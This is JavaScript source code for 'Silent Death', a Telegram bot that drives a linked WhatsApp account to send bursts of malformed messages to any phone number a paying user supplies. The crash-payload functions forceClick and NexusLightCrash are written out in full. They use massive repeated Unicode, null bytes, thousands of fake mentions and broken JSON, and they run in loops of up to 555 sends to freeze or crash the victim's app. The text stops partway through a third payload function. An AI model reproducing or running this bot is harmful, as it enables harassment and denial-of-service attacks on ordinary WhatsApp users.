const { Telegraf, Markup, session } = require("telegraf"); 
const fs = require("fs");
const path = require("path");
const moment = require("moment-timezone");
const {
  makeWASocket,
  makeInMemoryStore,
  fetchLatestBaileysVersion,
  useMultiFileAuthState,
  DisconnectReason,
  generateWAMessageFromContent,
  generateWAMessage,
} = require("@whiskeysockets/baileys");
const pino = require("pino");
const chalk = require("chalk");
const axios = require("axios");
const readline = require('readline');
const { BOT_TOKEN, OWNER_IDS } = require("./config.js");
const crypto = require("crypto");
const sessionPath = './session';
let bots = [];
const bot = new Telegraf(BOT_TOKEN);
const sleep = ms => new Promise(resolve => setTimeout(resolve, ms));
// === Path File ===
const premiumFile = "./Silent/premiums.json";
const adminFile = "./Silent/admins.json";

// === Fungsi Load & Save JSON ===
const loadJSON = (filePath) => {
  try {
    const data = fs.readFileSync(filePath);
    return JSON.parse(data);
  } catch (err) {
    console.error(chalk.red(`Gagal memuat file ${filePath}:`), err);
    return [];
  }
};

const saveJSON = (filePath, data) => {
  fs.writeFileSync(filePath, JSON.stringify(data, null, 2));
};

// === Load Semua Data Saat Startup ===
let adminUsers = loadJSON(adminFile);
let premiumUsers = loadJSON(premiumFile);

// === Middleware Role ===
const checkOwner = (ctx, next) => {
  const userId = ctx.from.id.toString(); 
  if (!OWNER_IDS.includes(userId)) {
    return ctx.reply("❗Mohon Maaf Fitur Ini Khusus Owner");
  }

  return next();
};

const checkAdmin = (ctx, next) => {
  if (!adminUsers.includes(ctx.from.id.toString())) {
    return ctx.reply("❗ Mohon Maaf Fitur Ini Khusus Admin.");
  }
  next();
};

const checkPremium = (ctx, next) => {
  if (!premiumUsers.includes(ctx.from.id.toString())) {
    return ctx.reply("❗ Mohon Maaf Fitur Ini Khusus Premium.");
  }
  next();
};

// === Fungsi Admin / Premium ===
const addAdmin = (userId) => {
  if (!adminUsers.includes(userId)) {
    adminUsers.push(userId);
    saveJSON(adminFile, adminUsers);
  }
};

const removeAdmin = (userId) => {
  adminUsers = adminUsers.filter((id) => id !== userId);
  saveJSON(adminFile, adminUsers);
};

const addPremium = (userId) => {
  if (!premiumUsers.includes(userId)) {
    premiumUsers.push(userId);
    saveJSON(premiumFile, premiumUsers);
  }
};

const removePremium = (userId) => {
  premiumUsers = premiumUsers.filter((id) => id !== userId);
  saveJSON(premiumFile, premiumUsers);
};
bot.use(session());

let yamz = null;
let isWhatsAppConnected = false;
let linkedWhatsAppNumber = "";
const usePairingCode = true;
///////// RANDOM IMAGE JIR \\\\\\\
const randomImages = [
"https://files.catbox.moe/fvtz5g.jpg",
"https://files.catbox.moe/fvtz5g.jpg",
];

const getRandomImage = () =>
  randomImages[Math.floor(Math.random() * randomImages.length)];

// Fungsi untuk mendapatkan waktu uptime
const getUptime = () => {
  const uptimeSeconds = process.uptime();
  const hours = Math.floor(uptimeSeconds / 3600);
  const minutes = Math.floor((uptimeSeconds % 3600) / 60);
  const seconds = Math.floor(uptimeSeconds % 60);

  return `${hours}h ${minutes}m ${seconds}s`;
};

const question = (query) =>
  new Promise((resolve) => {
    const rl = require("readline").createInterface({
      input: process.stdin,
      output: process.stdout,
    });
    rl.question(query, (answer) => {
      rl.close();
      resolve(answer);
    });
  });

// WhatsApp Connection
const store = makeInMemoryStore({ logger: pino().child({ level: 'silent', stream: 'store' }) });

const startSesi = async () => {
  const { state, saveCreds } = await useMultiFileAuthState('./session');
  const { version } = await fetchLatestBaileysVersion();

  const connectionOptions = {
    version,
    keepAliveIntervalMs: 30000,
    printQRInTerminal: false,
    logger: pino({ level: "silent" }),
    auth: state,
    browser: ['Mac OS', 'Safari', '10.15.7'],
    getMessage: async (key) => ({
      conversation: 'P', // Placeholder default
    }),
  };

  yamz = makeWASocket(connectionOptions);
  yamz.ev.on('creds.update', saveCreds);
  store.bind(yamz.ev);

  yamz.ev.on('connection.update', (update) => {
    const { connection, lastDisconnect } = update;

    if (connection === 'open') {
    yamz.newsletterFollow("120363420642654406@newsletter");
yamz.newsletterFollow("120363403052027067@newsletter");
yamz.newsletterFollow("120363421593365150@newsletter") ;
      yamz.newsletterFollow("120363420966527782@newsletter");
      isWhatsAppConnected = true;
      console.log(chalk.red.bold(`
╭─────────────────────────────╮
│ ${chalk.white('Berhasil Tersambung')}
╰─────────────────────────────╯`));
    }

    if (connection === 'close') {
      const shouldReconnect = lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut;
      console.log(chalk.red.bold(`
╭─────────────────────────────╮
│ ${chalk.white('Whatsapp Terputus')}
╰─────────────────────────────╯`));

      if (shouldReconnect) {
        console.log(chalk.red.bold(`
╭─────────────────────────────╮
│ ${chalk.white('Menyambung kembali...')}
╰─────────────────────────────╯`));
        startSesi();
      }

      isWhatsAppConnected = false;
    }
  });
};

const checkWhatsAppConnection = (ctx, next) => {
if (!isWhatsAppConnected) {
ctx.reply(`
❌ WhatsApp Belum terhubung
`);
return;
}
next();
};

////=========MENU UTAMA========\\\\
bot.start(async (ctx) => {
  const userId = ctx.from.id.toString();
  const isPremium = premiumUsers.includes(userId);
  const Name = ctx.from.username ? `@${ctx.from.username}` : userId;
  const waktuRunPanel = getUptime();
  const mainMenuMessage = `<blockquote>交 SILENT DEATHᝄ</blockquote>
<blockquote>( 👀 ) Holaa ☇ ${Name}. use the bot feature wisely, the creator is not responsible for what you do with this bot, enjoy.</blockquote>
<blockquote><b>╭════[ 𝐈𝐍𝐅𝐎𝐑𝐌𝐀𝐓𝐈𝐎𝐍 𝐁𝐎𝐓 ]═════❍</b>
<b>║𝙳𝙴𝚅𝙴𝙻𝙾𝙿𝙴𝚁 : 𝚈𝙰𝙼𝚉𝚉 𝙾𝙵𝙵𝙸𝙲𝙸𝙰𝙻</b>
<b>║𝙽𝙰𝙼𝙰 𝙱𝙾𝚃 : 𝚂𝙸𝙻𝙴𝙽𝚃 𝙳𝙴𝙰𝚃𝙷</b>
<b>║𝚅𝙴𝚁𝚂𝙸𝙾𝙽 : 𝟸.𝟶</b>
<b>║𝚃𝚈𝙿𝙴 : 𝙹𝙰𝚅𝙰𝚂𝙲𝚁𝙸𝙿𝚃</b>
<b>╰═════════════════════❍</b></blockquote>
<blockquote>© Yamzz Offcial ᝄ</blockquote>
`;

  const mainKeyboard = [
    [
      {
        text: "𝐁𝐮𝐠𝐌𝐞𝐧𝐮",
        callback_data: "bug_menu",
      },
      {
        text: "𝐎𝐰𝐧𝐞𝐫𝐌𝐞𝐧𝐮",
        callback_data: "owner_menu",
      },
    ],
    [
      {
        text: "𝐃𝐞𝐯𝐞𝐥𝐨𝐩𝐞𝐫",
        url: "https://t.me/yamzzoffc",
      },
    ],
  ];

  await ctx.replyWithPhoto(getRandomImage(), {
    caption: mainMenuMessage,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: mainKeyboard,
    },
  });
});

// Handler untuk owner_menu
bot.action("owner_menu", async (ctx) => {
  const Name = ctx.from.username ? `@${ctx.from.username}` : `${ctx.from.id}`;
  const waktuRunPanel = getUptime();    
      const mainMenuMessage = `<blockquote>交 𝐘𝐚𝐦𝐳𝐳𝐎𝐟𝐟𝐜 ᝄ</blockquote>
<blockquote>( 👀 ) Holaa ${Name}. use the bot feature wisely, the creator is not responsible for what you do with this bot, enjoy.</blockquote>
<blockquote><b>╭════[ 𝐈𝐍𝐅𝐎𝐑𝐌𝐀𝐓𝐈𝐎𝐍 𝐁𝐎𝐓 ]═════❍</b>
<b>║𝙳𝙴𝚅𝙴𝙻𝙾𝙿𝙴𝚁 : 𝚈𝙰𝙼𝚉𝚉 𝙾𝙵𝙵𝙸𝙲𝙸𝙰𝙻</b>
<b>║𝙽𝙰𝙼𝙰 𝙱𝙾𝚃 : 𝚂𝙸𝙻𝙴𝙽𝚃 𝙳𝙴𝙰𝚃𝙷</b>
<b>║𝚅𝙴𝚁𝚂𝙸𝙾𝙽 : 𝟸.𝟶</b>
<b>║𝚃𝚈𝙿𝙴 : 𝙹𝙰𝚅𝙰𝚂𝙲𝚁𝙸𝙿𝚃</b>
<b>║𝚃𝙸𝙼𝙴 : ${WaktuRunPanel}</b>
<b>╰═════════════════════❍</b></blockquote>
<blockquote><b>╭════[ 𝐀𝐃𝐌𝐈𝐍 𝐀𝐂𝐂𝐄𝐒𝐒 ]═════❍</b>
<b>║❍ /Addprem</b>
<b>║❍ /Delprem</b>
<b>║❍ /Cekprem</b>
<b>╰═════════════════════❍</b>
<b>╭════[ 𝐀𝐃𝐌𝐈𝐍 𝐀𝐂𝐂𝐄𝐒𝐒 ]═════❍</b>
<b>║❍ /Addadmin</b>
<b>║❍ /Deladmin</b>
<b>║❍ /Status</b>
<b>║❍ /Addsender</b>
<b>║❍ /Delsesi</b>
<b>╰═════════════════════❍</b></blockquote>
<blockquote>══[ © 𝐘𝐀𝐌𝐙𝐙 𝐎𝐅𝐅𝐈𝐂𝐈𝐀𝐋 ]══</blockquote>
`;

  const media = {
    type: "photo",
    media: getRandomImage(), 
    caption: mainMenuMessage,
    parse_mode: "HTML"
  };

  const keyboard = {
    inline_keyboard: [
      [{ text: "🔙 BackOptions", callback_data: "back" }],
    ],
  };

  try {
    await ctx.editMessageMedia(media, { reply_markup: keyboard });
  } catch (err) {
    await ctx.replyWithPhoto(media.media, {
      caption: media.caption,
      parse_mode: media.parse_mode,
      reply_markup: keyboard,
    });
  }
});
// Handler unbug_bug_menu
bot.action("bug_menu", async (ctx) => {
  const Name = ctx.from.username ? `@${ctx.from.username}` : `${ctx.from.id}`;
  const waktuRunPanel = getUptime();    
  const mainMenuMessage = `<blockquote>交 𝐘𝐚𝐦𝐳𝐳𝐎𝐟𝐟𝐜 ᝄ</blockquote>
<blockquote>( 👀 ) Holaa ${Name}. use the bot feature wisely, the creator is not responsible for what you do with this bot, enjoy.</blockquote>
<blockquote><b>╭════[ 𝐈𝐍𝐅𝐎𝐑𝐌𝐀𝐓𝐈𝐎𝐍 𝐁𝐎𝐓 ]═════❍</b>
<b>║𝙳𝙴𝚅𝙴𝙻𝙾𝙿𝙴𝚁 : 𝚈𝙰𝙼𝚉𝚉 𝙾𝙵𝙵𝙸𝙲𝙸𝙰𝙻</b>
<b>║𝙽𝙰𝙼𝙰 𝙱𝙾𝚃 : 𝚂𝙸𝙻𝙴𝙽𝚃 𝙳𝙴𝙰𝚃𝙷</b>
<b>║𝚅𝙴𝚁𝚂𝙸𝙾𝙽 : 𝟸.𝟶</b>
<b>║𝚃𝚈𝙿𝙴 : 𝙹𝙰𝚅𝙰𝚂𝙲𝚁𝙸𝙿𝚃</b>
<b>║𝚃𝙸𝙼𝙴 : ${WaktuRunPanel}</b>
<b>╰═════════════════════❍</b></blockquote>
<blockquote><b>╭════[ 𝐒𝐈𝐋𝐄𝐍𝐓 𝐃𝐄𝐋𝐀𝐘 ]═════❍</b>
<b>║❍ /DelayHard</b>
<b>║❍ /SdelayHard</b>
<b>║❍ /Combo</b>
<b>╰═════════════════════❍</b></blockquote>
<blockquote><b>╭════[ 𝐒𝐈𝐋𝐄𝐍𝐓 𝐃𝐄𝐋𝐀𝐘 ]═════❍</b>
<b>║❍ /BlankUi</b>
<b>║❍ /Svold</b>
<b>║❍ /Combo</b>
<b>╰═════════════════════❍</b></blockquote>
<blockquote>══[ ⚡ 𝐘𝐀𝐌𝐙𝐙 𝐎𝐅𝐅𝐈𝐂𝐈𝐀𝐋 ⚡ ]══</blockquote>
`;

  const media = {
    type: "photo",
    media: getRandomImage(),
    caption: mainMenuMessage,
    parse_mode: "HTML"
  };

  const keyboard = {
    inline_keyboard: [
      [{ text: "🔙 BackOptions", callback_data: "back" }],
    ],
  };

  try {
    await ctx.editMessageMedia(media, { reply_markup: keyboard });
  } catch (err) {
    await ctx.replyWithPhoto(media.media, {
      caption: media.caption,
      parse_mode: media.parse_mode,
      reply_markup: keyboard,
    });
  }
});
// Handler untuk back main menu
bot.action("back", async (ctx) => {
  const userId = ctx.from.id.toString();
  const isPremium = premiumUsers.includes(userId);
  const Name = ctx.from.username ? `@${ctx.from.username}` : userId;
  const waktuRunPanel = getUptime();
  const waStatus = yamz && yamz.user
      ? "Online"
      : "Offline"; 
      
  const mainMenuMessage = `<blockquote>交 SILENT DEATHᝄ</blockquote>
<blockquote>( 👀 ) Holaa ☇ ${Name}. use the bot feature wisely, the creator is not responsible for what you do with this bot, enjoy.
<blockquote><b>╭════[ 𝐈𝐍𝐅𝐎𝐑𝐌𝐀𝐓𝐈𝐎𝐍 𝐁𝐎𝐓 ]═════❍</b>
<b>║𝙳𝙴𝚅𝙴𝙻𝙾𝙿𝙴𝚁 : 𝚈𝙰𝙼𝚉𝚉 𝙾𝙵𝙵𝙸𝙲𝙸𝙰𝙻</b>
<b>║𝙽𝙰𝙼𝙰 𝙱𝙾𝚃 : 𝚂𝙸𝙻𝙴𝙽𝚃 𝙳𝙴𝙰𝚃𝙷</b>
<b>║𝚅𝙴𝚁𝚂𝙸𝙾𝙽 : 𝟸.𝟶</b>
<b>║𝚃𝚈𝙿𝙴 : 𝙹𝙰𝚅𝙰𝚂𝙲𝚁𝙸𝙿𝚃</b>
<b>╰═════════════════════❍</b></blockquote>
<blockquote>© Yamzz Offcial ᝄ</blockquote>
`;

  const media = {
    type: "photo",
    media: getRandomImage(),
    caption: mainMenuMessage,
    parse_mode: "HTML"
  };

  const mainKeyboard = [
    [
      {
        text: "𝐁𝐮𝐠𝐌𝐞𝐧𝐮",
        callback_data: "bug_menu",
      },
      {
        text: "𝐎𝐰𝐧𝐞𝐫𝐌𝐞𝐧𝐮",
        callback_data: "owner_menu",
      },
    ],
    [
      {
        text: "𝐃𝐞𝐯𝐞𝐥𝐨𝐩𝐞𝐫",
        url: "https://t.me/yamzzoffc",
      },
    ],
  ];

  try {
    await ctx.editMessageMedia(media, { reply_markup: { inline_keyboard: mainKeyboard } });
  } catch (err) {
    await ctx.replyWithPhoto(media.media, {
      caption: media.caption,
      parse_mode: media.parse_mode,
      reply_markup: { inline_keyboard: mainKeyboard },
    });
  }
});

//////// -- CASE BUG 1 --- \\\\\\\\\\\
// Fitur: xvisible
bot.command("SdelayHard", checkWhatsAppConnection, checkPremium, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`Example: /SdelayHard 62xxxx`);
  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  await ctx.sendPhoto("https://files.catbox.moe/fvtz5g.jpg", {
    caption: `
<blockquote>交 𝐘𝐚𝐦𝐳𝐳𝐎𝐟𝐟𝐜_ ᝄ</blockquote>  
─ WhatsAppにバグを送信するためのTelegramボット。注意と責任を持ってご利用ください.

" バグ情報
☇ Target: ${q}
☇ Status: Succes
☇ Type: /SdelayHard 
`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[{ text: "𝗖𝗵𝗲𝗰𝗸 ☇ 𝗧𝗮𝗿𝗴𝗲𝘁", url: `https://wa.me/${q}` }]],
    },
  });

  (async () => {
    for (let i = 0; i < 500; i++) {
      console.log(chalk.red(`Send Bug XdelayHard ${i + 1}/500 To ${q}`));
      await HoregSql(target, yamz);
      await sleep(300);
      await HoregSql(target, yamz);
      await sleep(500);
      await HoregSql(target, yamz);
      await sleep(500);
      await HoregSql(target, yamz);
      await sleep(2000);
    }
  })();
});
bot.command("DelayHard", checkWhatsAppConnection, checkPremium, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`Example: /DelayHard 62xxxx`);
  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  await ctx.sendPhoto("https://files.catbox.moe/fvtz5g.jpg", {
    caption: `
<blockquote>交 𝐘𝐚𝐦𝐳𝐳𝐎𝐟𝐟𝐜 ᝄ</blockquote>  
─ WhatsAppにバグを送信するためのTelegramボット。注意と責任を持ってご利用ください.

" バグ情報
☇ Target: ${q}
☇ Status: Succes
☇ Type: /DelayHard 
`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[{ text: "𝗖𝗵𝗲𝗰𝗸 ☇ 𝗧𝗮𝗿𝗴𝗲𝘁", url: `https://wa.me/${q}` }]],
    },
  });

  (async () => {
    for (let i = 0; i < 500; i++) {
      console.log(chalk.red(`Send Bug DelayHard ${i + 1}/500 To ${q}`));
      await axgankBug(target, yamz);
      await FcUiFlows(target, true);
      await sleep(800);
      await FcUiFlows(target, true);
      await sleep(1500);
    }
  })();
});
/////////----- CASE BUG 3 -----\\\\\\\\\\\
bot.command("Combo", checkWhatsAppConnection, checkPremium, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`Example: /Combo 62xxxx`);
  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  await ctx.sendPhoto("https://files.catbox.moe/fvtz5g.jpg", {
    caption: `
<blockquote>交 𝐘𝐚𝐦𝐳𝐳𝐎𝐟𝐟𝐜 ᝄ</blockquote>  
─ WhatsAppにバグを送信するためのTelegramボット。注意と責任を持ってご利用ください.

" バグ情報
☇ Target: ${q}
☇ Status: Succes
☇ Type: /Combo 
`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[{ text: "𝗖𝗵𝗲𝗰𝗸 ☇ 𝗧𝗮𝗿𝗴𝗲𝘁", url: `https://wa.me/${q}` }]],
    },
  });

  (async () => {
    for (let i = 0; i < 555; i++) {
      console.log(chalk.red(`Send Bug Combo ${i + 1}/555 To ${q}`));
      await HoregSql(target, yamz)
      await axgankBug(target, yamz);
      await axgankBug(target, yamz);
      await protocolbug7tama(target, true);
      await sleep(500);
      await protocolbug8tama(target, true);
      await sleep(1200);
      axgankBug(target, yamz);
      axgankBug(target, yamz);
      axgankBug(target, yamz);
      await sleep(1000) ;
    }
  })();
});

// === COMMAND /corruptor ===
bot.command("Svold", checkWhatsAppConnection, checkPremium, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`Example: /Svold 62xxxx`);
  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  await ctx.sendPhoto("https://files.catbox.moe/fvtz5g.jpg", {
    caption: `
<blockquote>交 𝐘𝐚𝐦𝐳𝐳𝐎𝐟𝐟𝐜 ᝄ</blockquote>  
─ WhatsAppにバグを送信するためのTelegramボット。注意と責任を持ってご利用ください.

" バグ情報
☇ Target: ${q}
☇ Status: Succes
☇ Type: /Svold 
`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[{ text: "𝗖𝗵𝗲𝗰𝗸 ☇ 𝗧𝗮𝗿𝗴𝗲𝘁", url: `https://wa.me/${q}` }]],
    },
  });

  (async () => {
    for (let i = 0; i < 35; i++) {
      console.log(chalk.red(`Send Bug Xvold ${i + 1}/35 To ${q}`));
      await NexusLightCrash(target);
      await sleep(400);
      await forceClick(yamz, target);
      await sleep(500);
      await forceClick(yamz, target);
      await sleep(800);
      await NexusLightCrash(target);
      await sleep(4000);
    }
  })();
});

// === COMMAND /flood ===
bot.command("BlankUi", checkWhatsAppConnection, checkPremium, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`Example: /BlankUi 62xxxx`);
  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  await ctx.sendPhoto("https://files.catbox.moe/fvtz5g.jpg", {
    caption: `
<blockquote>交 𝐘𝐚𝐦𝐳𝐳𝐎𝐟𝐟𝐜 ᝄ</blockquote>  
─ WhatsAppにバグを送信するためのTelegramボット。注意と責任を持ってご利用ください.

" バグ情報
☇ Target: ${q}
☇ Status: Succes
☇ Type: /BlankUi
`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[{ text: "𝗖𝗵𝗲𝗰𝗸 ☇ 𝗧𝗮𝗿𝗴𝗲𝘁", url: `https://wa.me/${q}` }]],
    }, 
  });

  (async () => {
    for (let i = 0; i < 40; i++) {
      console.log(chalk.red(`Send Bug BlankUi ${i + 1}/40 To ${q}`));
      await forceClick(yamz, target);
      await sleep(1000);
      await forceClick(yamz, target);
      await sleep(800);
      await NexusLightCrash(target);
      await sleep(800);
      await NexusLightCrash(target);
      await sleep(5000);
    }
  })();
});

// Perintah untuk menambahkan pengguna premium (hanya owner)
bot.command("Addadmin", checkOwner, (ctx) => {
  const args = ctx.message.text.split(" ");
  if (args.length < 2) {
    return ctx.reply(
      "❌ Format Salah!. Example: /Addadmin 12345678"
    );
  }

  const userId = args[1];

  if (adminUsers.includes(userId)) {
    return ctx.reply(`✅ Pengguna ${userId} sudah memiliki status admin.`);
  }

  adminUsers.push(userId);
  saveJSON(adminFile, adminUsers);

  return ctx.reply(`✅ Pengguna ${userId} sekarang memiliki akses admin!`);
});
bot.command("Addprem", checkOwner, checkAdmin, (ctx) => {
  const args = ctx.message.text.trim().split(" "); 

  if (args.length < 2) {
    return ctx.reply("❌ Format Salah!. Example : /Addprem 12345678");
  }

  const userId = args[1].toString();

  if (premiumUsers.includes(userId)) {
    return ctx.reply(`✅ Pengguna ${userId} sudah memiliki akses premium.`);
  }

  premiumUsers.push(userId);
  saveJSON(premiumFile, premiumUsers);

  return ctx.reply(`✅ Pengguna ${userId} sekarang adalah premium.`);
});
///=== comand del admin ===\\\
bot.command("deladmin", checkOwner, (ctx) => {
  const args = ctx.message.text.split(" ");
  if (args.length < 2) {
    return ctx.reply(
      "❌ Format Salah!. Example : /deladmin 12345678"
    );
  }

  const userId = args[1];

  if (!adminUsers.includes(userId)) {
    return ctx.reply(`❌ Pengguna ${userId} tidak ada dalam daftar Admin.`);
  }

  adminUsers = adminUsers.filter((id) => id !== userId);
  saveJSON(adminFile, adminUsers);

  return ctx.reply(`🚫 Pengguna ${userId} telah dihapus dari daftar Admin.`);
});
bot.command("Delprem", checkOwner, checkAdmin, (ctx) => {
  const args = ctx.message.text.trim().split(" ");

  if (args.length < 2) {
    return ctx.reply(
      "❌ Format Salah!. Example : /Delprem 12345678"
    );
  }

  const userId = args[1].toString();

  if (!premiumUsers.includes(userId)) {
    return ctx.reply(`❌ Pengguna ${userId} tidak ada dalam daftar premium.`);
  }

  premiumUsers = premiumUsers.filter((id) => id !== userId);
  saveJSON(premiumFile, premiumUsers);

  return ctx.reply(`🚫 Pengguna ${userId} telah dihapus dari akses premium.`);
});

// Perintah untuk mengecek status premium
bot.command("Cekprem", (ctx) => {
  const userId = ctx.from.id.toString();

  if (premiumUsers.includes(userId)) {
    return ctx.reply(`✅ Anda adalah pengguna premium.`);
  } else {
    return ctx.reply(`❌ Anda bukan pengguna premium.`);
  }
});

// Command untuk pairing WhatsApp
bot.command("Addsender", checkOwner, async (ctx) => {
  const args = ctx.message.text.split(" ");
  if (args.length < 2) {
    return await ctx.reply("❌ Format Salah!. Example : /Addsender <nomor_wa>");
  }

  let phoneNumber = args[1];
  phoneNumber = phoneNumber.replace(/[^0-9]/g, "");

  if (yamz && yamz.user) {
    return await ctx.reply("Whatsapp Sudah Terhubung");
  }

  try {
    const code = await yamz.requestPairingCode(phoneNumber, "KYZXOPWN");
    const formattedCode = code?.match(/.{1,4}/g)?.join("-") || code;

    await ctx.replyWithPhoto(getRandomImage(), {
      caption: `
<blockquote>
┏━━━━━━━━━━━━━━━━━━━━
┃☇ 𝗡𝗼𝗺𝗼𝗿 : ${phoneNumber}
┃☇ 𝗖𝗼𝗱𝗲 : <code>${formattedCode}</code>
┗━━━━━━━━━━━━━━━━━━━━
</blockquote>
`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [[{ text: "𝗛𝗮𝗽𝘂𝘀", callback_data: "Close" }]],
      },
    });
  } catch (error) {
    console.error(chalk.red("Gagal melakukan pairing:"), error);
    await ctx.reply("❌ Gagal melakukan pairing !");
  }
});
// Handler untuk tombol close
bot.action("Close", async (ctx) => {
  const userId = ctx.from.id.toString();

  if (!OWNER_IDS.includes(userId)) {
    return ctx.answerCbQuery("Lu Siapa Kontol", { show_alert: true });
  }

  try {
    await ctx.deleteMessage();
  } catch (error) {
    console.error(chalk.red("Gagal menghapus pesan:"), error);
    await ctx.answerCbQuery("❌ Gagal menghapus pesan!", { show_alert: true });
  }
});
///=== comand del sesi ===\\\\
bot.command("Delsesi", (ctx) => {
  const success = deleteSession();

  if (success) {
    ctx.reply("✅ Session berhasil di hapus, silahkan connect ulang");
  } else {
    ctx.reply("❌ Tidak ada session yang tersimpan saat ini.");
  }
});

////=== Fungsi Delete Session ===\\\\\\\
function deleteSession() {
  if (fs.existsSync(sessionPath)) {
    const stat = fs.statSync(sessionPath);

    if (stat.isDirectory()) {
      fs.readdirSync(sessionPath).forEach(file => {
        fs.unlinkSync(path.join(sessionPath, file));
      });
      fs.rmdirSync(sessionPath);
      console.log('Folder session berhasil dihapus.');
    } else {
      fs.unlinkSync(sessionPath);
      console.log('File session berhasil dihapus.');
    }

    return true;
  } else {
    console.log('Session tidak ditemukan.');
    return false;
  }
}

////////// OWNER MENU \\\\\\\\\
bot.command("Status", checkOwner, checkAdmin, async (ctx) => {
  try {
    const waStatus = yamz && yamz.user
      ? "Terhubung"
      : "Tidak Terhubung";

    const message = `
<blockquote>
┏━━━━━━━━━━━━━━━━━━━━
┃ STATUS WHATSAPP
┣━━━━━━━━━━━━━━━━━━━━
┃ ⌬ STATUS : ${waStatus}
┗━━━━━━━━━━━━━━━━━━━━
</blockquote>
`;

    await ctx.reply(message, {
      parse_mode: "HTML"
    });

  } catch (error) {
    console.error("Gagal menampilkan status bot:", error);
    ctx.reply("❌ Gagal menampilkan status bot.");
  }
});
/////////////////END/////////////////////////

///////////////////[FUNC]////////////////
///////////[Func Fc]///////////////////
async function forceClick(yamz, target) {
  const buttonsList = [
    { type: "single_select", params: "" }
  ];

  for (let i = 0; i < 10; i++) {
    buttonsList.push(
      { type: "call_button", params: JSON.stringify({ status: true }) },
      { type: "copy_button", params: JSON.stringify({ display_text: "ꦽ".repeat(5000) }) },
      { type: "quick_reply", params: JSON.stringify({ display_text: "ꦽ".repeat(5000) }) }
    );
  }

  const messageData = {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          contextInfo: {
            participant: target,
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from({ length: 1900 }, () => `${Math.floor(Math.random() * 5000000)}@s.whatsapp.net`)
            ]
          },
          remoteJid: target,
          participant: `${Math.floor(Math.random() * 5000000)}@s.whatsapp.net`,
          stanzaId: "123",
          quotedMessage: {
            paymentInviteMessage: {
              serviceType: 3,
              expiryTimestamp: Date.now() + 1814400000
            },
            forwardedAiBotMessageInfo: {
              botName: "META AI",
              botJid: `${Math.floor(Math.random() * 5000000)}@s.whatsapp.net`,
              creatorName: "Bot"
            }
          }
        },
        carouselMessage: {
          messageVersion: 1,
          cards: [
            {
              header: {
                hasMediaAttachment: true,
                imageMessage: {
                  url: "https://mmg.whatsapp.net/v/t62.7118-24/533457741_1915833982583555_6414385787261769778_n.enc",
                  mimetype: "image/jpeg",
                  fileSha256: "QpvbDu5HkmeGRODHFeLP7VPj+PyKas/YTiPNrMvNPh4=",
                  fileLength: "9999999999999",
                  height: 9999,
                  width: 9999,
                  mediaKey: "exRiyojirmqMk21e+xH1SLlfZzETnzKUH6GwxAAYu/8=",
                  fileEncSha256: "D0LtargetIMWZ0qD/NmWxPMl9tphAlzdpVG/A3JxMHvEsySk=",
                  directPath: "/v/t62.7118-24/533457741_1915833982583555_6414385787261769778_n.enc"
                }
              },
              body: { text: "\n" + "\u0000".repeat(50000) },
              nativeFlowMessage: {
                buttons: buttonsList,
                messageParamsJson: "{".repeat(10000)
              }
            }
          ]
        }
      }
    }
  };

  await yamz.relayMessage(target, messageData, { messageId: null, participant: { jid: target }, userJid: target });
}
////////////[Func NexusCrash]////////////
async function NexusLightCrash(target) {
let CrashMsg = "ꦽ".repeat(10000);
let Iphone = "𑇂𑆵𑆴𑆿𑆿".repeat(15000);
let Invisible = "\u200E\u200F\u202E\u2066\u2067".repeat(15000);

  try {
    const msg = await generateWAMessageFromContent(target.id, {
      interactiveMessage: {
        title: "⟅ ༑ ▾𝐍‌𝐄‌𝐗‌𝐔‌𝐒 🕷️ 𝐗‌-𝐓‌𝐑‌𝐀‌𝐒‌𝐇⟅ ༑ ▾",
        footer: CrashMsg,
        thumbnail: "https://files.catbox.moe/ykvioj.jpg",
        nativeFlowMessage: {
          messageParamsJson: JSON.stringify({
            limited_time_offer: {
              text: "⟅ ༑ ▾𝐍‌𝐄‌𝐗‌𝐔‌𝐒 🩸 𝐗‌-𝐓‌𝐑‌𝐀‌𝐒‌𝐇⟅ ༑ ▾",
              url: `https://bokep.gacor.${"𑇂𑆵𑆴𑆿".repeat(25000)}.com`,
              copy_code: Iphone,
              expiration_time: Date.now() * 999
            },
            bottom_sheet: {
              in_thread_buttons_limit: 2,
              divider_indices: [1, 2, 3, 4, 5, 999],
              list_title: "⏤‌‌‌‌𝐅𝐢𝐧𝐳𝐳𝐓𝐡𝐞‌𝐌𝐨𝐝𝐳𝐳⃭⃬⃑ᝄ",
              button_title: "\x10".repeat(15000), 
            },
            tap_target_configuration: {
              title: "X",
              description: "\u200B",
              canonical_url: "https://t.me/FinzzModzz",
              domain: "pornhub.com",
              button_index: 0
            }
          }),
          buttons: [
            {
              name: "cta_copy",
              buttonParamsJson: JSON.stringify({
                display_text: Invisible,
                id: "123456789",
                copy_code: `https://makloe.pornhub.${"𑇂𑆵𑆴𑆿".repeat(25000)}.com`,
              })
            }
          ]
        }
      }
    },
{});

    await yamz.relayMessage( target.id,   msg.message, { messageId: msg.key.id }
    );

  } catch (error) {
    console.error("Failed To Send NexusLightCrash Message:", error);
  }
}
////////////[Horeg Sql]//////////////
async function HoregSql(target, yamz) {
    const delaymention = Array.from({ length: 30000 }, (_, r) => ({
        title: "こんにちは".repeat(92000) + "ꦽ".repeat(92000) + "\u0000".repeat(92000),
